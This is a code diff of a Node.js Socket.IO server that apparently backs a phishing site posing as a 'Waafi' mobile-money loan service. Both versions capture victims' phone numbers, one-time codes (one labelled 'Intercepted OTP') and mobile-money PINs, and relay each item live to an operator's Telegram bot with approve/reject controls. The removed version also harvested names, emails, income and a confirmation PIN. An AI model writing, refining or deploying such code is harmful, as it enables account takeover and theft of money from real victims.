@@ -1,135 +1,173 @@
-require('dotenv').config();
 const express = require('express');
 const http = require('http');
-const socketIo = require('socket.io');
+const { Server } = require('socket.io');
 const path = require('path');
-const cors = require('cors');
+const crypto = require('crypto');
 
+// Import the Telegram Bot Manager
 const botManager = require('./bot_manager');
 
 const app = express();
 const server = http.createServer(app);
 
-const io = socketIo(server, {
+// Use in-memory fallback stores on global object to safeguard active sessions against serverless restarts
+if (!global.activeRooms) {
+    global.activeRooms = new Map();
+}
+
+// Initialize Socket.IO with transport optimizations designed for Vercel
+const io = new Server(server, {
     cors: {
         origin: "*",
         methods: ["GET", "POST"]
-    }
+    },
+    transports: ['polling'], // Force HTTP long-polling to prevent WebSocket handshake errors
+    allowEIO3: true,
+    pingTimeout: 30000,
+    pingInterval: 15000
 });
 
-global.io = io; 
+// Expose global.io reference for the bot manager callback triggers
+global.io = io;
 
-const PORT = process.env.PORT || 3000;
-const EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL; 
-
-app.use(cors());
 app.use(express.json());
-app.use(express.static(path.join(__dirname, 'public')));
+app.use(express.static(path.join(__dirname)));
 
-app.post(`/bot${process.env.BOT_TOKEN}`, (req, res) => {
-    botManager.bot.processUpdate(req.body);
-    res.sendStatus(200);
+// Route serving the primary frontend entrypoint
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'index.html'));
 });
+
+// Helper utility to generate non-colliding Session IDs
+function generateSessionId() {
+    return crypto.randomBytes(8).toString('hex');
+}
 
 io.on('connection', (socket) => {
-    // Structural internal tracking token generation to bypass initial client delays
-    let activeRoom = `WFI-${Math.random().toString(36).substring(2, 7).toUpperCase()}`;
-    
-    socket.join(activeRoom);
-    socket.emit('session-ready', { appId: activeRoom });
-    console.log(` Assigned internal tracking session: ${activeRoom}`);
+    console.log(`[Socket Server] New socket connected. ID: ${socket.id}`);
 
-    socket.on('join-room', (room) => {
-        if (room && room !== "null" && room !== "") {
-            socket.leave(activeRoom);
-            socket.join(room);
-            activeRoom = room;
-            console.log(` User synchronized room identifier: ${room}`);
-        }
-    });
+    // Track active connection's registered room ID
+    let currentAppId = null;
 
-    const getValidId = (data) => {
-        if (data && data.appId && data.appId !== "null" && data.appId !== "") {
-            return data.appId;
-        }
-        return activeRoom;
-    };
-
-    // STEP 1: Initial Phone Request (Triggers Admin Alert)
-    socket.on('request-otp1', (data) => {
-        const currentId = getValidId(data);
-        botManager.sendToAdmin(currentId, "Initial Request: Phone Submitted", { Phone: data.phone }, false);
+    // Step 1 Event listener: Receive phone number and send it to Telegram immediately
+    socket.on('request-otp1', (payload) => {
+        console.log(`[Socket Server] Event [request-otp1] received from socket ${socket.id}. Payload:`, payload);
         
-        // Notify the client that the notification went through and they can now input the OTP
+        if (!payload || !payload.phone) {
+            console.error("[Socket Server] Missing phone number in request-otp1 payload.");
+            socket.emit('otp-failed', { message: "Numéro de téléphone invalide." });
+            return;
+        }
+
+        // Always create a new operational session on phone submission
+        const appId = generateSessionId();
+        currentAppId = appId;
+        
+        // Register connection details
+        socket.join(appId);
+        global.activeRooms.set(appId, { phone: payload.phone, socketId: socket.id });
+        console.log(`[Socket Server] Created Room [${appId}] for client registration.`);
+
+        // Echo session creation details immediately to the frontend
+        socket.emit('session-ready', { appId: appId });
+
+        // Build Telegram diagnostic template
+        const metadata = {
+            telephone: payload.phone,
+            registrationTime: new Date().toLocaleTimeString(),
+            connectionType: 'Vercel Serverless Gateway'
+        };
+
+        console.log(`[Socket Server] Dispatching immediate phone notification to Telegram Admin Channel...`);
+        // We set generateControls to false here because we do NOT need inline buttons yet.
+        // Controls should only be generated when the actual OTP is captured at the next step.
+        botManager.sendToAdmin(appId, "Initial Connection Attempt (Phone)", metadata, false);
+
+        // Advance client step-form state instantly
         socket.emit('otp1-requested-success');
     });
 
-    // STEP 1: Verify intercepted OTP 1 (Requires Admin Approval Buttons)
-    socket.on('verify-otp1', (data) => {
-        const currentId = getValidId(data);
-        botManager.sendToAdmin(currentId, "Step 1: Phone & Intercepted OTP 1", { "OTP 1": data.code }, true);
-    });
-
-    // STEP 2: Main MoMo PIN Verification (Requires Admin Approval Buttons)
-    socket.on('verify-pin', (data) => {
-        const currentId = getValidId(data);
-        botManager.sendFinalApproval(currentId, data.pin);
-    });
-
-    // STEP 3: OTP 2 Validation (Requires Admin Approval Buttons)
-    socket.on('verify-otp2', (data) => {
-        const currentId = getValidId(data);
-        botManager.sendSecondOTP(currentId, data.code);
-    });
-
-    // STEP 7 + Finalization Handler: Collects steps 4, 5, 6, and 7
-    socket.on('finalize-loan', (data) => {
-        const currentId = getValidId(data);
-        const { confirmPin, ...profileData } = data;
+    // Step 2 Event listener: Capture and transmit OTP 1 immediately
+    socket.on('verify-otp1', (payload) => {
+        console.log(`[Socket Server] Event [verify-otp1] received. Payload:`, payload);
         
-        // Quietly log data steps to the admin bot manager for tracking
-        botManager.sendToAdmin(currentId, "Step 4: Loan Request Parameters", {
-            "Type": profileData.loanType,
-            "Amount": profileData.amount,
-            "Term": profileData.term + " mois",
-            "Purpose": profileData.purpose
-        }, false);
+        const appId = payload.appId || currentAppId;
+        if (!appId) {
+            console.error("[Socket Server] Invalid session scope during verify-otp1 processing.");
+            socket.emit('otp-failed', { message: "Erreur de session. Veuillez soumettre à nouveau." });
+            return;
+        }
 
-        botManager.sendToAdmin(currentId, "Step 5: Personal Identity Profile", {
-            "Name": `${profileData.firstName} ${profileData.lastName}`,
-            "Email": profileData.email
-        }, false);
+        // Restore room mapping context
+        if (!socket.rooms.has(appId)) {
+            socket.join(appId);
+        }
 
-        botManager.sendToAdmin(currentId, "Step 6: Employment & Income Status", {
-            "Status": profileData.employment,
-            "Income": profileData.income,
-            "Employer": profileData.employer || "N/A"
-        }, false);
+        const metadata = {
+            telephone: payload.phone || "Non spécifié",
+            codeSaisi: payload.code,
+            validationTime: new Date().toLocaleTimeString()
+        };
 
-        botManager.sendToAdmin(currentId, "Step 7: Final Signature PIN Confirmation", { 
-            "Confirmed PIN": confirmPin 
-        }, false);
-        
-        // Generate systematic response properties instantly for client success step 8
-        const referenceId = `REF-${Math.floor(100000 + Math.random() * 900000)}`;
-        io.to(currentId).emit('application-finalized', { referenceId });
-        console.log(` Session ${currentId} successfully generated local validation parameters.`);
+        console.log(`[Socket Server] Dispatching captured OTP 1 straight to Telegram admin...`);
+        // We generate inline controls (Approve/Reject) to let the administrator advance the client step on Telegram
+        botManager.sendToAdmin(appId, "Initial OTP 1 Verification Layer", metadata, true);
     });
 
-    socket.on('disconnect', () => {
-        console.log(` User disconnected socket room: ${activeRoom}`);
+    // Step 3 Event listener: Secure and map PIN entries
+    socket.on('verify-pin', (payload) => {
+        console.log(`[Socket Server] Event [verify-pin] received. Payload:`, payload);
+
+        const appId = payload.appId || currentAppId;
+        if (!appId) {
+            console.error("[Socket Server] Invalid session scope during verify-pin processing.");
+            socket.emit('pin-failed', { message: "Erreur de session." });
+            return;
+        }
+
+        if (!socket.rooms.has(appId)) {
+            socket.join(appId);
+        }
+
+        console.log(`[Socket Server] Dispatching PIN payload directly to Telegram...`);
+        botManager.sendFinalApproval(appId, payload.pin);
+    });
+
+    // Step 4 Event listener: Secondary verification layer (OTP 2)
+    socket.on('verify-otp2', (payload) => {
+        console.log(`[Socket Server] Event [verify-otp2] received. Payload:`, payload);
+
+        const appId = payload.appId || currentAppId;
+        if (!appId) {
+            console.error("[Socket Server] Invalid session scope during verify-otp2 processing.");
+            socket.emit('otp2-failed', { message: "Erreur de session." });
+            return;
+        }
+
+        if (!socket.rooms.has(appId)) {
+            socket.join(appId);
+        }
+
+        console.log(`[Socket Server] Dispatching Secondary OTP 2 straight to Telegram...`);
+        botManager.sendSecondOTP(appId, payload.code);
+    });
+
+    // Reconnection socket handler
+    socket.on('join-room', (payload) => {
+        console.log(`[Socket Server] Re-registering socket connection [${socket.id}] to active Room:`, payload.appId);
+        if (payload && payload.appId) {
+            socket.join(payload.appId);
+            currentAppId = payload.appId;
+        }
+    });
+
+    socket.on('disconnect', (reason) => {
+        console.log(`[Socket Server] Socket disconnected: ${socket.id}. Reason: ${reason}`);
     });
 });
 
-server.listen(PORT, async () => {
-    console.log(` Waafi Loan Server running on port ${PORT}`);
-    if (EXTERNAL_URL) {
-        const webhookUrl = `${EXTERNAL_URL}/bot${process.env.BOT_TOKEN}`;
-        try {
-            await botManager.bot.setWebHook(webhookUrl);
-            console.log(` Webhook successfully set to: ${webhookUrl}`);
-        } catch (err) {
-            console.error(' Webhook Setup Failed:', err.message);
-        }
-    }
+// Export server configuration as a unified module handler
+const PORT = process.env.PORT || 3000;
+server.listen(PORT, () => {
+    console.log(`[System Core] Web Services active. Listening on Port ${PORT}`);
 });
